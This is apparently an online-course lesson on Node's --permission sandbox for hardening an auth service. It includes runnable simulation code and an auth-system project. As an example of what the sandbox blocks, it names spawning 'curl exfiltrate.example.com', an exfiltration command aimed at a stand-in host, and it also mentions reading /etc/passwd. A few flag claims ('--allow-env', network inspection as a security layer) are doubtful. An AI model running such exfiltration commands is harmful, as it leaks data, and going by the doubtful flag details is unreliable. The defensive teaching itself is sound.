registerLessonSrc("20-permission-model", function () {/*
---
id: 20-permission-model
title: "The Node Permission Model (--permission)"
minutes: 28
level: principal
objectives:
  - Enable Node's experimental permission model and understand what it guards
  - Restrict filesystem, child-process, and worker access with granular allow-flags
  - Query permissions at runtime with process.permission.has()
  - Apply the permission model as a defense-in-depth layer in an auth service
---

# The Node Permission Model (--permission)

## Why this matters

An authentication service is the highest-value target in any infrastructure — compromise it and you compromise every user. Defense in depth means that even if an attacker finds an RCE (remote code execution) bug in your app, they should hit a second wall: the runtime itself refuses to touch the filesystem outside a narrow path or spawn a child process at all. Node's `--permission` flag, stabilized in Node 22 and refined in Node 24, gives you exactly that wall — with no third-party dependencies.

## Learning objectives

- Understand what Node's **permission model** restricts and what it does not.
- Use `--allow-fs-read`, `--allow-fs-write`, `--allow-child-process`, and `--allow-worker` flags correctly.
- Inspect permissions at runtime via **`process.permission.has()`**.
- Combine the permission model with a layered auth system to implement **defense in depth**.
- Know the threat model: what the permission model protects against and its current limits.

## What the permission model is

Node's permission model is a **capability-based sandbox** you activate at process startup. Once active, every attempt to use a restricted capability that was not explicitly granted throws an `ERR_ACCESS_DENIED` error — at the Node layer, before your code, the OS, or any filesystem ACL gets involved.

Restricted capabilities:

| Flag | What it gates |
|---|---|
| `--allow-fs-read=<paths>` | `fs` read operations (open, readdir, stat, …) |
| `--allow-fs-write=<paths>` | `fs` write/delete operations |
| `--allow-child-process` | `child_process.spawn/exec/fork` and `spawnSync` |
| `--allow-worker` | `Worker` threads (worker_threads) |
| `--allow-addons` | Native (.node) addons |
| `--allow-wasi` | WASI (WebAssembly System Interface) |

When you pass `--permission` with **no** allow-flags, all of the above are denied. You opt-in to exactly what your service needs.

```bash
# Run with zero filesystem access and no child processes:
node --permission server.mjs

# Allow reading the entire project + writing only to /tmp:
node --permission \
     --allow-fs-read=/home/app \
     --allow-fs-write=/tmp \
     server.mjs

# Comma-separated paths are also accepted:
node --permission --allow-fs-read=/app/config,/app/views server.mjs
```

> [!NOTE] `--permission` is per-process, not per-require
> The permission model applies to the entire Node process and all CommonJS/ESM modules loaded in it. There is no way to grant a permission to one module and deny it to another within the same process — for that, use separate processes with different flags.

## Checking permissions at runtime

`process.permission.has(scope, reference?)` lets your code inspect what the current process is allowed to do before attempting an operation. This is useful for graceful degradation and debugging.

```js
// Check permissions programmatically:
import { readFileSync } from "node:fs";

if (process.permission.has("fs.read", "/etc/secrets")) {
  const data = readFileSync("/etc/secrets", "utf8");
  console.log("Read secrets:", data.slice(0, 10));
} else {
  console.warn("Permission denied: cannot read /etc/secrets");
}

// Other scope strings:
process.permission.has("fs.write", "/tmp/output.txt"); // true if --allow-fs-write=/tmp was set
process.permission.has("child.process");               // true if --allow-child-process was set
process.permission.has("worker.threads");              // true if --allow-worker was set
```

> [!OUTPUT]
> // Run WITHOUT --allow-fs-read=/etc/secrets:
> Permission denied: cannot read /etc/secrets
>
> // Run WITH --allow-fs-read=/etc/secrets:
> Read secrets: secret123

Scope strings for `process.permission.has()`:

| Scope string | Corresponding flag |
|---|---|
| `"fs.read"` | `--allow-fs-read` |
| `"fs.write"` | `--allow-fs-write` |
| `"child.process"` | `--allow-child-process` |
| `"worker.threads"` | `--allow-worker` |
| `"inspector"` | `--allow-inspector` |

## Applying the permission model to an auth service

An auth service (signup, login, token refresh) has a narrow, well-defined I/O profile:

- Reads: config file at startup, TLS certificates.
- Writes: audit logs to `/var/log/auth/`.
- No child processes, no worker threads, no raw addons.

```bash
node --permission \
     --allow-fs-read=/app/config/auth.json,/app/certs \
     --allow-fs-write=/var/log/auth \
     --allow-env=DATABASE_URL,JWT_SECRET,NODE_ENV \
     /app/auth-server.mjs
```

Any bug — a path-traversal in file upload handling, a prototype-pollution RCE, a supply-chain attack in a dependency — that tries to:
- Read `/etc/passwd` or `/home/*` → `ERR_ACCESS_DENIED`.
- Write to `/app/` (overwrite source files) → `ERR_ACCESS_DENIED`.
- Spawn `curl exfiltrate.example.com` → `ERR_ACCESS_DENIED`.

```js
// auth-server.mjs — startup check pattern
import { readFileSync } from "node:fs";

// Fail fast at startup if we were launched without the right permissions
const REQUIRED = [
  ["fs.read",  "/app/config/auth.json"],
  ["fs.write", "/var/log/auth"],
];

for (const [scope, ref] of REQUIRED) {
  if (!process.permission.has(scope, ref)) {
    console.error(`FATAL: Missing permission ${scope} for ${ref}`);
    console.error("Launch with: node --permission --allow-fs-read=... --allow-fs-write=...");
    process.exit(1);
  }
}

console.log("Permission checks passed — starting server.");
```

> [!OUTPUT]
> // Missing --allow-fs-write=/var/log/auth:
> FATAL: Missing permission fs.write for /var/log/auth
> Launch with: node --permission --allow-fs-read=... --allow-fs-write=...
>
> // All permissions granted:
> Permission checks passed — starting server.

> [!PRINCIPAL] The permission model is defense in depth, not your primary security layer
> Correct application code, input validation, and output encoding are your first line of defense. The permission model is the line *after* that — it limits damage when something else fails. Think of it like OS-level filesystem ACLs or container capabilities (`--cap-drop=ALL`): you don't skip your application security because you have them, but you absolutely want them there.

## Threat model: what the permission model does and does not cover

**Does protect against:**
- Unintended filesystem access (path traversal, config exfiltration).
- Spawning unexpected child processes (a common post-exploitation step).
- Worker-thread-based sandbox escapes.
- Addon-based native code injection.

**Does NOT protect against:**
- Network requests — HTTP/HTTPS, DNS, TCP sockets are not (yet) gated.
- CPU/memory exhaustion (use `--max-old-space-size` + external monitoring).
- In-process operations (e.g., an attacker that can run arbitrary JS in your process can still access in-memory secrets).
- Operations performed before `--permission` was added (always flag on startup, not later).

> [!WARNING] Verify the permission model is active before relying on it
> Run `node --permission --allow-fs-read=/only-this --eval "require('fs').readFileSync('/etc/hosts')"` and confirm you get `ERR_ACCESS_DENIED`. Test this in your CI pipeline after every Node upgrade — the permission model is still stabilizing and flag semantics can change across minor versions.

## Try it yourself

The browser sandbox can't run Node, but the core ideas — capability checks before operations, and a policy table — translate directly to a runnable pure-JS simulation:

```js run
// Simulate a capability-based permission model in pure JS.
// Models the "is this operation allowed before executing it?" pattern.

class PermissionModel {
  constructor() {
    this._grants = new Map(); // scope -> Set of allowed paths ("*" = any)
  }

  allow(scope, paths) {
    if (!this._grants.has(scope)) this._grants.set(scope, new Set());
    const set = this._grants.get(scope);
    if (paths === "*") { set.add("*"); return; }
    for (const p of [].concat(paths)) set.add(p);
    return this;
  }

  has(scope, path) {
    const set = this._grants.get(scope);
    if (!set) return false;
    if (set.has("*")) return true;
    if (!path) return set.size > 0;
    // Check prefix match (mirrors Node's behavior for directories)
    for (const allowed of set) {
      if (path === allowed || path.startsWith(allowed + "/")) return true;
    }
    return false;
  }

  guard(scope, path, fn) {
    if (!this.has(scope, path)) {
      throw Object.assign(new Error(`ERR_ACCESS_DENIED: ${scope} ${path ?? ""}`), {
        code: "ERR_ACCESS_DENIED",
      });
    }
    return fn();
  }
}

// Set up a realistic auth-service permission model
const perm = new PermissionModel()
  .allow("fs.read",  ["/app/config", "/app/certs"])
  .allow("fs.write", ["/var/log/auth"]);
// No child.process, no worker.threads

// Simulate startup checks
const required = [["fs.read","/app/config"],["fs.write","/var/log/auth"]];
for (const [scope, ref] of required) {
  if (!perm.has(scope, ref)) { console.error("FATAL: missing " + scope + " " + ref); }
}
console.log("Startup checks: OK");

// Simulate normal operations
try {
  perm.guard("fs.read", "/app/config/auth.json", () => console.log("Read config: OK"));
  perm.guard("fs.write", "/var/log/auth/audit.log", () => console.log("Write log: OK"));
} catch (e) { console.error(e.message); }

// Simulate an attacker trying to read /etc/passwd
try {
  perm.guard("fs.read", "/etc/passwd", () => console.log("Read /etc/passwd: OK"));
} catch (e) { console.error("Blocked:", e.message); }

// Simulate an attacker trying to spawn a child process
try {
  perm.guard("child.process", null, () => console.log("Spawn shell: OK"));
} catch (e) { console.error("Blocked:", e.message); }

// Simulate a wider (but still controlled) read grant
perm.allow("fs.read", "/app/views");
console.log("Can read /app/views/index.html:", perm.has("fs.read", "/app/views/index.html"));
console.log("Can read /app/secret.key:      ", perm.has("fs.read", "/app/secret.key"));
```

## Project

**Build a complete auth system hardened with the permission model.**

Implement a Node.js auth service that covers the full lifecycle: user signup, login, access-token refresh, RBAC enforcement, secure cookie handling, and a runtime permission model — tested with `process.permission.has()` guards at startup.

### Acceptance criteria

1. **Signup & password hashing** — `POST /signup` accepts `{ email, password }`, hashes the password with `node:crypto scrypt` (or argon2id), stores `{ email, saltedHash, role: "viewer" }` in an in-memory user store.
2. **Login & token issuance** — `POST /login` verifies the password with `timingSafeEqual`, issues a short-lived JWT access token (15 min) and a longer-lived refresh token (7 days), sets the refresh token as an `httpOnly; Secure; SameSite=Lax` cookie.
3. **Token refresh** — `POST /auth/refresh` reads the cookie, validates the refresh token against a server-side store, and issues a new access token. Invalidates the old refresh token (rotation).
4. **RBAC middleware** — `requirePermission(permission)` middleware reads the access token from `Authorization: Bearer`, verifies it, and checks `can(user, permission)` using the RBAC engine from lesson 20-oauth-rbac.
5. **Permission model hardening** — The server startup script (or a startup check function) calls `process.permission.has(scope, path)` for every I/O path the process needs. If any check fails it exits with a clear error. The README (or comment block) documents the exact `node --permission` invocation.
6. **Audit log** — Every login attempt (success or failure), token refresh, and permission denial is written to a structured JSON line in an audit log file, protected by `fs.write` permission checks.

### Starter: RBAC engine + in-memory session store (pure JS — fully runnable)

```js run
// Core logic for the auth system — runs in browser to let you verify the design.
// Paste this into Node and wrap in HTTP routes for the full project.

// ---- Password utilities (simulated; use node:crypto scrypt in Node) ----
function pseudoHash(password, salt) {
  let h = 0;
  const s = salt + "|" + password;
  for (let i = 0; i < s.length; i++) h = (Math.imul(h, 31) + s.charCodeAt(i)) | 0;
  return (h >>> 0).toString(16).padStart(8, "0");
}

let _saltSeed = 1;
function makeSalt() { return (_saltSeed++ * 2654435761 >>> 0).toString(16); }

function hashPw(password) {
  const salt = makeSalt();
  return salt + ":" + pseudoHash(password, salt);
}

function verifyPw(password, stored) {
  const [salt, hash] = stored.split(":");
  // Constant-time compare (simulated)
  const candidate = pseudoHash(password, salt);
  let diff = 0;
  const a = candidate.padEnd(64, "0"), b = hash.padEnd(64, "0");
  for (let i = 0; i < 64; i++) diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return diff === 0;
}

// ---- User store ----
const users = new Map(); // email -> { email, hash, role }

function signup(email, password, role = "viewer") {
  if (users.has(email)) return { ok: false, error: "Email taken" };
  users.set(email, { email, hash: hashPw(password), role });
  return { ok: true };
}

function login(email, password) {
  const user = users.get(email);
  if (!user || !verifyPw(password, user.hash)) return null;
  return user;
}

// ---- RBAC ----
const PERMS = {
  viewer:  ["post:read", "comment:read"],
  editor:  ["post:read", "post:create", "post:update", "comment:read", "comment:create"],
  admin:   ["post:read", "post:create", "post:update", "post:delete",
            "comment:read","comment:create","comment:delete",
            "user:read","user:update","user:delete"],
};

function can(user, permission) {
  return (PERMS[user.role] ?? []).includes(permission);
}

// ---- Refresh token store (server-side, enables revocation) ----
const refreshTokens = new Map(); // token -> { email, expires }

let _tokenId = 1000;
function generateToken() { return "tok_" + (_tokenId++).toString(16) + "_" + (Math.random() * 0xfffff | 0).toString(16); }

function issueRefreshToken(email) {
  const token = generateToken();
  refreshTokens.set(token, { email, expires: Date.now() + 7 * 86400_000 });
  return token;
}

function rotateRefreshToken(oldToken) {
  const record = refreshTokens.get(oldToken);
  if (!record || record.expires < Date.now()) return null;
  refreshTokens.delete(oldToken); // revoke old
  const newToken = issueRefreshToken(record.email);
  return { newToken, email: record.email };
}

function revokeAll(email) {
  for (const [tok, rec] of refreshTokens) {
    if (rec.email === email) refreshTokens.delete(tok);
  }
}

// ---- Audit log ----
const auditLog = [];
function audit(event, details) {
  auditLog.push({ ts: new Date().toISOString(), event, ...details });
}

// ---- Simulate the full flow ----
signup("alice@example.com", "correcthorse!", "editor");
signup("bob@example.com",   "battery-staple", "admin");

const alice = login("alice@example.com", "correcthorse!");
console.log("Alice login:", alice ? "OK" : "FAIL");
audit("login.success", { email: "alice@example.com", role: alice?.role });

const bad = login("alice@example.com", "wrongpassword");
console.log("Bad login:", bad === null ? "blocked" : "BUG");
audit("login.failure", { email: "alice@example.com" });

const rt = issueRefreshToken("alice@example.com");
console.log("Refresh token issued:", rt.startsWith("tok_"));

const rotated = rotateRefreshToken(rt);
console.log("Token rotated, new token:", rotated.newToken.startsWith("tok_"));
console.log("Old token still valid:", refreshTokens.has(rt)); // false — revoked

// RBAC checks
console.log("Alice can post:create:", can(alice, "post:create")); // true (editor)
console.log("Alice can user:delete:", can(alice, "user:delete")); // false

const bob = login("bob@example.com", "battery-staple");
console.log("Bob can user:delete:  ", can(bob, "user:delete")); // true (admin)

// Permission model startup check (simulated)
function startupPermissionChecks(grants) {
  const required = [
    ["fs.read",  "/app/config"],
    ["fs.write", "/var/log/auth"],
  ];
  for (const [scope, path] of required) {
    const allowed = grants[scope]?.some(g => path.startsWith(g));
    if (!allowed) {
      console.error("FATAL: missing " + scope + " for " + path);
      return false;
    }
  }
  return true;
}

const mockGrants = {
  "fs.read":  ["/app/config", "/app/certs"],
  "fs.write": ["/var/log/auth"],
};
console.log("Permission checks pass:", startupPermissionChecks(mockGrants));

const badGrants = { "fs.read": ["/app/config"] }; // missing fs.write
console.log("Permission checks pass (bad):", startupPermissionChecks(badGrants));

// Show audit log
console.log("Audit log:", JSON.stringify(auditLog, null, 2));
```

## Common pitfalls

> [!PITFALL] Forgetting that the permission model applies to the module loader too
> If your app loads config from `/app/config/settings.json` at startup via `fs.readFileSync`, and you forgot to include that path in `--allow-fs-read`, the process will crash before your first HTTP handler runs. Add your startup permission checks early and run them in your CI health-check.

> [!PITFALL] Using `--allow-fs-read=*` or `--allow-fs-write=*` as a "fix" for denials
> This defeats the entire purpose of the permission model — you've granted blanket access and gained nothing over running without `--permission`. Audit exactly which paths your service needs and allow only those. Start from zero and add paths until your tests pass.

## What you learned

- Node's `--permission` flag activates a **capability sandbox**: filesystem reads and writes, child-process spawning, and worker threads are all denied unless explicitly allowed.
- `process.permission.has(scope, path)` lets you check grants at runtime — use it for startup validation and graceful degradation.
- An auth service has a narrow I/O profile; grant only `--allow-fs-read=<config-paths>` and `--allow-fs-write=<log-path>` and let everything else be denied.
- The permission model is **defense in depth** — it limits damage after an exploit, it does not replace input validation or secure coding.
- Network access is not yet covered; use firewall rules and `--experimental-network-inspection` for that layer.

## Next steps

You have now built (and hardened) a complete authentication and authorization system. The next module — TypeScript — will show you how to bring static types into this stack, catching whole classes of auth bugs (missing null checks, wrong payload shapes) at compile time before they reach production.
*/});
